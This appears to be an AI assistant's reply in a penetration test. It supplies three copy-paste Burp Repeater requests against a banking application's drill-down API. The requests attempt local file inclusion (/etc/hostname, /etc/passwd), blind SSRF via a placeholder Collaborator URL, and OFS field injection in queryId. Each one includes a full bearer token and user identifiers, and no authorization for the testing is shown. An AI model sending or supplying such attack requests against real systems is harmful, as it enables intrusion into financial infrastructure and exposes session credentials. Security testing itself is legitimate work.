Understood. I will provide the **full, raw HTTP requests** for you to copy-paste directly into Burp Repeater. I will also give you specific keywords to search for in the response, so you don't have to copy-paste the whole thing.

Here are the tests for Vector 2 (LFI/SSRF) and Vector 3 (OFS Injection). I am using your exact first request (`queryDrillDownRequests`) as the template.

### Test 1: Local File Inclusion (LFI) via `currentVariable`
This tests if the backend reads the file path you provide. I changed the value to `/etc/hostname`.

**Copy-paste this entire block into Burp Repeater:**

```http
POST /tb-server/api/v1.0.0/browser/queryDrillDownRequests/ HTTP/2
Host: api.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: application/json, text/plain, */*
Accept-Language: en-US, en; q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://transactweb-perf.amswe.dev.euw.gbis.sg-azure.com/
Jsonlayout: true
Authorization: Bearer eyJ0eXAi0iJKV1QiLCJrawQi0iJyK0JHODQ5WExGUXFnSkJhaThBMGdVd3I0U0E9IiwiYWxnIjoiUlMyNTYifQ. eyJhdF9oYXNoIjoiZUVRTN5bDBTakNpbk5mUFVnMORQdyIsInN1YiI6InByYXNhbm5hLnB1dHR1Z293ZGEtZXh0QHNVY2dlbi5jb20iLCJhdWRpdFRyYWNraw5nSwi0iJjODI2NWNkYy0ZYTU5LTQzNmQtYjYWNC010TNmMmM1YjRiNGItNjYxNDIyMDE5IiwiaXNzIjoiaHR@cHM6Ly9zc28uc2dtYXJrZXRzLrNvbTo0NDMvc2djb25uZWNOL29hdXRoMiIsInRva2VuTmFtZSI6Imlkx3Rva2VuIiwiYXVkIjoiNGYWOGZkMWItNjViOS00YTE3LWE3MDAtWIyND1jMDYWYTA1IiwiYWNyIjoiTDEiLCJhenAi0iI0ZjA4ZmQxYi02NWI5LTRhMTctYTcwMC1hYjIOOWMwNjBhMDUiLCJhdXRoX3RpbwU6MTC4MTY3NDY2NjgsInJlYWxtIjoiLyIsImV4cCI6MTC4MTY4MTY4NSwidG9rZW5UeXB1IjoiSldUVG9rZW4iLCJpYXQi0jE30DE20DEWOD9.mR9Cr78dey7FpdjJTTNubyCDL9f787mpt91YCheC6WuZkMt31gjN6i_yrTn-G3v9tUZeF4Rw9a0uJWAuXsHnXn_HFoUq4ThN6X8TscCKCC_EMOEzPdU1Ac8KjIXzjjCx24m3IKGAMSXzfcUsPsxQVltUtTebt_goz3fT206imBjNnugMBkAZBYhSThLunuPqidgHmRuGC7G4yY-za9Qo9z5uDm8Xt8TpquIDGZLAZ095idzwRv5UwncjT1C1Fb3h3pWmck3a0YQ7x6Kma2QV-0k3tqHPA1C0LNXV4WuhJHk-mN7Img4AFXtUUTOstGZ-w7X0aaJkGaW6gSKCsGpeg
Defaultcompany: BE0010001
Defaultusername: PUTT1009923601
Norole: CSAM-MAKER-BRU
Content-Type: application/json
Origin: https://transactweb-perf.amswe.dev.euw.gbis.sg-azure.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Priority: u=0
Te: trailers
Content-Length: 442

{
"body": {
"ref":"1_1_1",
"queryId":"SG.AA. FIND. DORMANT. ARRANGEMENT",
"windowId": "PUTT1009923601_ENQ_SG. AA. FIND. DORMANT . ARRANGEMENT1781680274035",
"parentwindowId": "PUTT1009923601_ENQ_SG. AA. FIND. DORMANT . ARRANGEMENT1781680274035",
"reqTabid":"",
"currentVariable":"\/etc\/hostname",
"enqname": "SG.AA. FIND. DORMANT . ARRANGEMENT",
"drillaction":"COS.DRILL",
"previousEnqs":"_SG. AA. FIND. DORMANT. ARRANGEMENT_",
"previousEnqTitles":"_Find Dormant Arrangements_"
}
}
```

**What to search for in the Response:**
Search the response body for a string that looks like a server name (e.g., `ip-10-0-0-x`, `ubuntu`, `t24-prod`). If you see an error, search for `No such file` or `Permission denied`.

---

### Test 2: Blind SSRF via `currentVariable`
This tests if the backend makes an outbound network request based on your input. 
**Before sending:** Go to Burp Collaborator tab, click "Copy to clipboard", and replace `YOUR_COLLABORATOR_URL_HERE` in the request below with your URL.

**Copy-paste this entire block into Burp Repeater:**

```http
POST /tb-server/api/v1.0.0/browser/queryDrillDownRequests/ HTTP/2
Host: api.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: application/json, text/plain, */*
Accept-Language: en-US, en; q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://transactweb-perf.amswe.dev.euw.gbis.sg-azure.com/
Jsonlayout: true
Authorization: Bearer eyJ0eXAi0iJKV1QiLCJrawQi0iJyK0JHODQ5WExGUXFnSkJhaThBMGdVd3I0U0E9IiwiYWxnIjoiUlMyNTYifQ. eyJhdF9oYXNoIjoiZUVRTN5bDBTakNpbk5mUFVnMORQdyIsInN1YiI6InByYXNhbm5hLnB1dHR1Z293ZGEtZXh0QHNVY2dlbi5jb20iLCJhdWRpdFRyYWNraw5nSwi0iJjODI2NWNkYy0ZYTU5LTQzNmQtYjYWNC010TNmMmM1YjRiNGItNjYxNDIyMDE5IiwiaXNzIjoiaHR@cHM6Ly9zc28uc2dtYXJrZXRzLrNvbTo0NDMvc2djb25uZWNOL29hdXRoMiIsInRva2VuTmFtZSI6Imlkx3Rva2VuIiwiYXVkIjoiNGYWOGZkMWItNjViOS00YTE3LWE3MDAtWIyND1jMDYWYTA1IiwiYWNyIjoiTDEiLCJhenAi0iI0ZjA4ZmQxYi02NWI5LTRhMTctYTcwMC1hYjIOOWMwNjBhMDUiLCJhdXRoX3RpbwU6MTC4MTY3NDY2NjgsInJlYWxtIjoiLyIsImV4cCI6MTC4MTY4MTY4NSwidG9rZW5UeXB1IjoiSldUVG9rZW4iLCJpYXQi0jE30DE20DEWOD9.mR9Cr78dey7FpdjJTTNubyCDL9f787mpt91YCheC6WuZkMt31gjN6i_yrTn-G3v9tUZeF4Rw9a0uJWAuXsHnXn_HFoUq4ThN6X8TscCKCC_EMOEzPdU1Ac8KjIXzjjCx24m3IKGAMSXzfcUsPsxQVltUtTebt_goz3fT206imBjNnugMBkAZBYhSThLunuPqidgHmRuGC7G4yY-za9Qo9z5uDm8Xt8TpquIDGZLAZ095idzwRv5UwncjT1C1Fb3h3pWmck3a0YQ7x6Kma2QV-0k3tqHPA1C0LNXV4WuhJHk-mN7Img4AFXtUUTOstGZ-w7X0aaJkGaW6gSKCsGpeg
Defaultcompany: BE0010001
Defaultusername: PUTT1009923601
Norole: CSAM-MAKER-BRU
Content-Type: application/json
Origin: https://transactweb-perf.amswe.dev.euw.gbis.sg-azure.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Priority: u=0
Te: trailers
Content-Length: 442

{
"body": {
"ref":"1_1_1",
"queryId":"SG.AA. FIND. DORMANT. ARRANGEMENT",
"windowId": "PUTT1009923601_ENQ_SG. AA. FIND. DORMANT . ARRANGEMENT1781680274035",
"parentwindowId": "PUTT1009923601_ENQ_SG. AA. FIND. DORMANT . ARRANGEMENT1781680274035",
"reqTabid":"",
"currentVariable":"http:\/\/YOUR_COLLABORATOR_URL_HERE",
"enqname": "SG.AA. FIND. DORMANT . ARRANGEMENT",
"drillaction":"COS.DRILL",
"previousEnqs":"_SG. AA. FIND. DORMANT. ARRANGEMENT_",
"previousEnqTitles":"_Find Dormant Arrangements_"
}
}
```

**What to do after sending:**
Go to the Burp Collaborator tab and click "Poll now". Tell me if you see any DNS or HTTP interactions. You don't need to check the Repeater response for this one.

---

### Test 3: OFS Field Injection via `queryId`
This tests if the `queryId` parameter is concatenated directly into an OFS message. I added `,NAME:test` to the `queryId` value.

**Copy-paste this entire block into Burp Repeater:**

```http
POST /tb-server/api/v1.0.0/browser/queryDrillDownRequests/ HTTP/2
Host: api.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: application/json, text/plain, */*
Accept-Language: en-US, en; q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://transactweb-perf.amswe.dev.euw.gbis.sg-azure.com/
Jsonlayout: true
Authorization: Bearer eyJ0eXAi0iJKV1QiLCJrawQi0iJyK0JHODQ5WExGUXFnSkJhaThBMGdVd3I0U0E9IiwiYWxnIjoiUlMyNTYifQ. eyJhdF9oYXNoIjoiZUVRTN5bDBTakNpbk5mUFVnMORQdyIsInN1YiI6InByYXNhbm5hLnB1dHR1Z293ZGEtZXh0QHNVY2dlbi5jb20iLCJhdWRpdFRyYWNraw5nSwi0iJjODI2NWNkYy0ZYTU5LTQzNmQtYjYWNC010TNmMmM1YjRiNGItNjYxNDIyMDE5IiwiaXNzIjoiaHR@cHM6Ly9zc28uc2dtYXJrZXRzLrNvbTo0NDMvc2djb25uZWNOL29hdXRoMiIsInRva2VuTmFtZSI6Imlkx3Rva2VuIiwiYXVkIjoiNGYWOGZkMWItNjViOS00YTE3LWE3MDAtWIyND1jMDYWYTA1IiwiYWNyIjoiTDEiLCJhenAi0iI0ZjA4ZmQxYi02NWI5LTRhMTctYTcwMC1hYjIOOWMwNjBhMDUiLCJhdXRoX3RpbwU6MTC4MTY3NDY2NjgsInJlYWxtIjoiLyIsImV4cCI6MTC4MTY4MTY4NSwidG9rZW5UeXB1IjoiSldUVG9rZW4iLCJpYXQi0jE30DE20DEWOD9.mR9Cr78dey7FpdjJTTNubyCDL9f787mpt91YCheC6WuZkMt31gjN6i_yrTn-G3v9tUZeF4Rw9a0uJWAuXsHnXn_HFoUq4ThN6X8TscCKCC_EMOEzPdU1Ac8KjIXzjjCx24m3IKGAMSXzfcUsPsxQVltUtTebt_goz3fT206imBjNnugMBkAZBYhSThLunuPqidgHmRuGC7G4yY-za9Qo9z5uDm8Xt8TpquIDGZLAZ095idzwRv5UwncjT1C1Fb3h3pWmck3a0YQ7x6Kma2QV-0k3tqHPA1C0LNXV4WuhJHk-mN7Img4AFXtUUTOstGZ-w7X0aaJkGaW6gSKCsGpeg
Defaultcompany: BE0010001
Defaultusername: PUTT1009923601
Norole: CSAM-MAKER-BRU
Content-Type: application/json
Origin: https://transactweb-perf.amswe.dev.euw.gbis.sg-azure.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Priority: u=0
Te: trailers
Content-Length: 442

{
"body": {
"ref":"1_1_1",
"queryId":"SG.AA. FIND. DORMANT. ARRANGEMENT,NAME:test",
"windowId": "PUTT1009923601_ENQ_SG. AA. FIND. DORMANT . ARRANGEMENT1781680274035",
"parentwindowId": "PUTT1009923601_ENQ_SG. AA. FIND. DORMANT . ARRANGEMENT1781680274035",
"reqTabid":"",
"currentVariable":"\/etc\/passwd",
"enqname": "SG.AA. FIND. DORMANT . ARRANGEMENT",
"drillaction":"COS.DRILL",
"previousEnqs":"_SG. AA. FIND. DORMANT. ARRANGEMENT_",
"previousEnqTitles":"_Find Dormant Arrangements_"
}
}
```

**What to search for in the Response:**
Search the response body for these exact strings:
1.  `TAFJERR-1060`
2.  `field NAME not valid`
3.  `OFS`

Tell me if you find any of these, or tell me the general error message you see.
